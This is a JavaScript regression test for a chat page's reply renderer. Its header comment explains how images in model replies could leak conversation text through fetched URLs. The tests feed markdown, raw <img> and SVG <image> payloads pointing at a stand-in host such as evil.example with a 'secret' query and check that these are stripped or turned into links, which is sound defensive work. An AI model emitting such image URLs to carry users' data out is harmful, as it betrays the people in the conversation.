// Regression cover for how a model reply is rendered (S15 in
// docs/review/codebase_review_20260924.md).
//
// `renderBotHTML` ran `DOMPurify.sanitize(marked.parse(text))` with DOMPurify's
// default config, which keeps <img>, under a CSP whose `img-src` allowed any
// HTTPS origin. So an image in a reply - one the model produced, or one a
// visitor pasted in and got echoed back - made the page fetch whatever URL it
// named: a tracking pixel, or a channel that carries conversation text out in
// the URL. These load the real vendored DOMPurify and marked, because the
// defect was their default behaviour, not anything a stub would show.
import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import { JSDOM } from "jsdom";

const vendor = (name) => fs.readFileSync(new URL(`../vendor/${name}`, import.meta.url), "utf8");

describe("Chat reply rendering", () => {
  let dom;
  let renderBotHTML;

  before(async () => {
    dom = new JSDOM("<!doctype html><html><body></body></html>", {
      url: "http://localhost:8080/",
      runScripts: "outside-only",
    });
    dom.window.eval(vendor("purify.min.js"));
    dom.window.eval(vendor("marked.min.js"));
    // config.js reads the reduced-motion preference at import.
    dom.window.matchMedia = () => ({
      matches: false,
      addEventListener() {}, removeEventListener() {},
      addListener() {}, removeListener() {},
    });
    global.window = dom.window;
    global.document = dom.window.document;
    global.localStorage = dom.window.localStorage;
    global.HTMLElement = dom.window.HTMLElement;
    // analytics.js probes a local API at import; nothing here needs one.
    global.fetch = async () => ({ ok: false, status: 404, json: async () => ({}) });
    // chat.js reads these as bare globals, as the page's classic scripts leave them.
    global.DOMPurify = dom.window.DOMPurify;
    global.marked = dom.window.marked;
    ({ renderBotHTML } = await import("../js/chat.js"));
  });

  after(() => {
    for (const key of ["window", "document", "localStorage", "HTMLElement", "DOMPurify", "marked", "fetch"]) {
      delete global[key];
    }
    dom.window.close();
  });

  const render = (text) => {
    const host = dom.window.document.createElement("div");
    host.innerHTML = renderBotHTML(text);
    return host;
  };

  it("renders a markdown image as a link to it, and fetches nothing", () => {
    const host = render("Here: ![a chart](https://evil.example/pixel.png?c=secret)");

    assert.equal(host.querySelector("img"), null, "no <img> may reach the page");
    const link = host.querySelector("a");
    assert.ok(link, "the image becomes a link the visitor can see");
    assert.equal(link.getAttribute("href"), "https://evil.example/pixel.png?c=secret");
    assert.equal(link.textContent, "a chart");
    assert.match(link.getAttribute("rel"), /noopener/);
  });

  it("strips an <img> that arrives as raw HTML", () => {
    const host = render('Look <img src="https://evil.example/p.png" alt="x"> here');
    assert.equal(host.querySelector("img"), null);
    assert.match(host.textContent, /Look\s+here/);
  });

  it("strips an SVG <image>, which fetches the same way", () => {
    const host = render('<svg><image href="https://evil.example/p.png"></image></svg>');
    assert.equal(host.querySelector("image"), null);
  });

  it("still renders the markdown a reply is meant to have", () => {
    const host = render("**bold** and a [link](https://rjasti.com/)\n\n- one\n- two");
    assert.ok(host.querySelector("strong"));
    assert.equal(host.querySelector("a").getAttribute("href"), "https://rjasti.com/");
    assert.equal(host.querySelectorAll("li").length, 2);
  });
});
